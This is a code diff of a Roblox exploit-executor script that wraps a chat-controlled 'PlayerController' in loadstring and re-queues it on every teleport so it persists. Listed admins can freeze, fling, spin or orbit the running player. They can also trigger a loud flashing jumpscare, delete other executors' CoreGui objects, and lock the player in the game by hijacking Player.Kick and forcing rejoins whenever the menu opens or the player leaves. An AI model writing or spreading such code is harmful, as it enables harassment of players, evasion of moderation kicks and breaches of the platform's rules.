@@ -1,3 +1,6 @@
+if not game:IsLoaded() then game.Loaded:Wait() end
+
+local PlayerController = [[
 local Players = game:GetService("Players")
 local TeleportService = game:GetService("TeleportService")
 local CoreGui = game:GetService("CoreGui")
@@ -21,13 +24,8 @@ local conn = { connections = {} }
 local var = { variables = {} }
 
 function conn.new(name, event, callback)
-    local ok, connection = pcall(function()
-        return event:Connect(callback)
-    end)
-    if ok then
-        conn.connections[name] = connection
-        return connection
-    end
+    local ok, connection = pcall(function() return event:Connect(callback) end)
+    if ok then conn.connections[name] = connection return connection end
 end
 
 function conn.remove(name)
@@ -42,13 +40,9 @@ function var.new(name, value)
     return value
 end
 
-function var.get(name)
-    return var.variables[name]
-end
+function var.get(name) return var.variables[name] end
 
-function var.set(name, value)
-    var.variables[name] = value
-end
+function var.set(name, value) var.variables[name] = value end
 
 var.new("originalWalkSpeed", 16)
 var.new("originalJumpPower", 50)
@@ -73,13 +67,9 @@ local function GetDevice()
     local touch = UserInputService.TouchEnabled
     local keyboard = UserInputService.KeyboardEnabled
     local mouse = UserInputService.MouseEnabled
-    if touch and not keyboard and not mouse then
-        return "Mobile"
-    elseif not touch and keyboard and mouse then
-        return "PC"
-    else
-        return "Unknown"
-    end
+    if touch and not keyboard and not mouse then return "Mobile"
+    elseif not touch and keyboard and mouse then return "PC"
+    else return "Unknown" end
 end
 
 local function GetOS()
@@ -101,13 +91,8 @@ local function SendChat(message)
     end)
 end
 
-cmd.new("getdevice", function()
-    SendChat("Player Device: " .. GetDevice())
-end)
-
-cmd.new("getos", function()
-    SendChat("Player OS: " .. GetOS())
-end)
+cmd.new("getdevice", function() SendChat("Player Device: " .. GetDevice()) end)
+cmd.new("getos", function() SendChat("Player OS: " .. GetOS()) end)
 
 cmd.new("freeze", function()
     local humanoid = Player.Character and Player.Character:FindFirstChildOfClass("Humanoid")
@@ -119,9 +104,7 @@ cmd.new("freeze", function()
     end
     if Player.Character then
         for _, part in ipairs(Player.Character:GetDescendants()) do
-            if part:IsA("BasePart") then
-                part.Anchored = true
-            end
+            if part:IsA("BasePart") then part.Anchored = true end
         end
     end
 end)
@@ -134,9 +117,7 @@ cmd.new("unfreeze", function()
     end
     if Player.Character then
         for _, part in ipairs(Player.Character:GetDescendants()) do
-            if part:IsA("BasePart") then
-                part.Anchored = false
-            end
+            if part:IsA("BasePart") then part.Anchored = false end
         end
     end
 end)
@@ -163,9 +144,7 @@ cmd.new("fling", function()
     if root then
         local direction = Vector3.new(math.random(-100, 100), math.random(150, 600), math.random(-100, 100))
         root.Velocity = direction
-        if humanoid then
-            humanoid.Sit = true
-        end
+        if humanoid then humanoid.Sit = true end
     end
 end)
 
@@ -183,7 +162,6 @@ cmd.new("orbit", function(args, admin)
     local adminRoot = admin.Character and admin.Character:FindFirstChild("HumanoidRootPart")
     local localRoot = Player.Character and Player.Character:FindFirstChild("HumanoidRootPart")
     if not adminRoot or not localRoot then return end
-
     if var.get("isOrbiting") then
         var.set("isOrbiting", false)
         if var.get("orbitConnection") then
@@ -191,10 +169,8 @@ cmd.new("orbit", function(args, admin)
             var.set("orbitConnection", nil)
         end
     end
-
     var.set("isOrbiting", true)
     local angle, radius, speed = 0, 5, 2
-
     local orbitConnection = RunService.RenderStepped:Connect(function()
         if not var.get("isOrbiting") or not adminRoot or not adminRoot.Parent or not localRoot then
             if var.get("orbitConnection") then
@@ -223,7 +199,6 @@ cmd.new("spin", function(args)
     local speedNum = tonumber(args[1]) or 5
     local hrp = Player.Character and Player.Character:FindFirstChild("HumanoidRootPart")
     if not hrp then return end
-
     if var.get("isSpinning") then
         var.set("isSpinning", false)
         if var.get("spinConnection") then
@@ -231,10 +206,8 @@ cmd.new("spin", function(args)
             var.set("spinConnection", nil)
         end
     end
-
     var.set("isSpinning", true)
     var.set("currentSpinSpeed", speedNum)
-
     local spinConnection = RunService.RenderStepped:Connect(function()
         if not var.get("isSpinning") or not hrp then
             if var.get("spinConnection") then
@@ -289,30 +262,21 @@ end)
 cmd.new("rejoinlock", function()
     if var.get("rejoinLockEnabled") then return end
     var.set("rejoinLockEnabled", true)
-
+    getgenv().PlayerController.rejoinLockPersist = true
     local function rejoin()
-        pcall(function()
-            TeleportService:Teleport(game.PlaceId, Player)
-        end)
+        pcall(function() TeleportService:Teleport(game.PlaceId, Player) end)
     end
-
     if not var.get("kickHookActive") then
         var.set("originalKick", Player.Kick)
         var.set("kickHookActive", true)
-        Player.Kick = function(reason)
-            rejoin()
-        end
+        Player.Kick = function(reason) rejoin() end
     end
-
     local menuConn = GuiService.MenuOpened:Connect(function()
         rejoin()
     end)
     var.set("menuOpenedConnection", menuConn)
-
     local function onPlayerRemoving(player)
-        if player == Player then
-            rejoin()
-        end
+        if player == Player then rejoin() end
     end
     conn.new("rejoinLock_playerRemoving", Players.PlayerRemoving, onPlayerRemoving)
 end)
@@ -320,14 +284,12 @@ end)
 cmd.new("unrejoinlock", function()
     if not var.get("rejoinLockEnabled") then return end
     var.set("rejoinLockEnabled", false)
-
+    getgenv().PlayerController.rejoinLockPersist = false
     if var.get("menuOpenedConnection") then
         var.get("menuOpenedConnection"):Disconnect()
         var.set("menuOpenedConnection", nil)
     end
-
     conn.remove("rejoinLock_playerRemoving")
-
     if var.get("kickHookActive") then
         Player.Kick = var.get("originalKick") or Player.Kick
         var.set("kickHookActive", false)
@@ -339,7 +301,6 @@ cmd.new("jumpscare", function()
     if var.get("jumpscareActive") then return end
     var.set("jumpscareActive", true)
     var.set("jumpscareLoops", true)
-
     local effects = {}
     local colorCorrection = Instance.new("ColorCorrectionEffect")
     colorCorrection.TintColor = Color3.fromRGB(255, 0, 0)
@@ -347,27 +308,22 @@ cmd.new("jumpscare", function()
     colorCorrection.Saturation = 1
     colorCorrection.Parent = Lighting
     table.insert(effects, colorCorrection)
-
     local blur = Instance.new("BlurEffect")
     blur.Size = 0
     blur.Parent = Lighting
     table.insert(effects, blur)
-
     local bloom = Instance.new("BloomEffect")
     bloom.Intensity = 2
     bloom.Size = 40
     bloom.Threshold = 0.8
     bloom.Parent = Lighting
     table.insert(effects, bloom)
-
     local sunRays = Instance.new("SunRaysEffect")
     sunRays.Intensity = 0.5
     sunRays.Spread = 0.5
     sunRays.Parent = Lighting
     table.insert(effects, sunRays)
-
     var.set("jumpscareEffects", effects)
-
     task.spawn(function()
         local toggle = true
         while var.get("jumpscareActive") do
@@ -382,7 +338,6 @@ cmd.new("jumpscare", function()
             task.wait(0.08)
         end
     end)
-
     task.spawn(function()
         while var.get("jumpscareActive") do
             local camera = workspace.CurrentCamera
@@ -402,7 +357,6 @@ cmd.new("jumpscare", function()
             task.wait(0.03)
         end
     end)
-
     for _ = 1, 10 do
         local sound = Instance.new("Sound")
         sound.SoundId = "rbxassetid://4899159505"
@@ -412,7 +366,6 @@ cmd.new("jumpscare", function()
         sound:Play()
         task.wait(0.05)
     end
-
     task.spawn(function()
         while var.get("jumpscareActive") and var.get("jumpscareLoops") do
             local loopedSound = Instance.new("Sound")
@@ -430,19 +383,13 @@ end)
 cmd.new("unjumpscare", function()
     var.set("jumpscareActive", false)
     var.set("jumpscareLoops", false)
-
     local effects = var.get("jumpscareEffects")
     for _, v in ipairs(effects) do
-        if typeof(v) == "Instance" then
-            v:Destroy()
-        end
+        if typeof(v) == "Instance" then v:Destroy() end
     end
     var.set("jumpscareEffects", {})
-
     local camera = workspace.CurrentCamera
-    if camera then
-        camera.CameraType = Enum.CameraType.Custom
-    end
+    if camera then camera.CameraType = Enum.CameraType.Custom end
 end)
 
 cmd.new("delexec", function()
@@ -465,7 +412,6 @@ cmd.new("delexec", function()
             ["BlockingApp"] = true, ["HealthGui"] = true, ["StutterDetector"] = true,
             ["AvatarContextMenuItem"] = true
         }
-
         local function getTopLevelContainer(obj)
             local current = obj
             while current.Parent and current.Parent ~= CoreGui and current.Parent ~= game do
@@ -473,7 +419,6 @@ cmd.new("delexec", function()
             end
             return current
         end
-
         local function isJumbled(name)
             if string.match(name, "[^%w%s%-%.]") then return true end
             if #name > 30 then return true end
@@ -488,12 +433,9 @@ cmd.new("delexec", function()
             end
             return false
         end
-
         for _, obj in ipairs(CoreGui:GetDescendants()) do
             local topContainer = getTopLevelContainer(obj)
-            if topContainer and whitelistedContainers[topContainer.Name] then
-                continue
-            end
+            if topContainer and whitelistedContainers[topContainer.Name] then continue end
             if isJumbled(obj.Name) then
                 pcall(function() obj:Destroy() end)
             end
@@ -505,18 +447,14 @@ local function executeCommand(commandName, args, admin)
     local command = cmd.commands[commandName]
     if command then
         local success, err = pcall(command, args, admin)
-        if not success then
-            warn("[!" .. commandName .. " error]: " .. tostring(err))
-        end
+        if not success then warn("[!" .. commandName .. " error]: " .. tostring(err)) end
     end
 end
 
 local function onChatMessage(plr, msg)
     if plr == Player then return end
     if not table.find(Admins, plr.Name) then return end
-
     local commandMsg
-
     if string.sub(msg, 1, 1) == "!" then
         commandMsg = string.sub(msg, 2)
     elseif string.sub(msg, 1, 3) == "/e " then
@@ -524,12 +462,10 @@ local function onChatMessage(plr, msg)
     else
         return
     end
-
     local parts = {}
     for part in string.gmatch(commandMsg, "%S+") do
         table.insert(parts, part)
     end
-
     if #parts > 0 then
         local cmdName = string.lower(parts[1])
         local args = { table.unpack(parts, 2) }
@@ -544,3 +480,23 @@ end
 conn.new("player_added", Players.PlayerAdded, function(plr)
     conn.new(plr.Name .. "_chatted", plr.Chatted, function(msg) onChatMessage(plr, msg) end)
 end)
+
+if getgenv().PlayerController and getgenv().PlayerController.rejoinLockPersist then
+    task.wait(0.5)
+    pcall(function() cmd.commands["rejoinlock"]() end)
+end
+]]
+
+if not getgenv().PlayerController then getgenv().PlayerController = {} end
+if getgenv().PlayerController.isLoaded then
+    error("PlayerController already loaded", 0)
+end
+
+getgenv().PlayerController.isLoaded = true
+
+if queue_on_teleport then
+    queue_on_teleport(PlayerController)
+end
+
+local success, err = loadstring(PlayerController)()
+if not success then error(err, 0) end
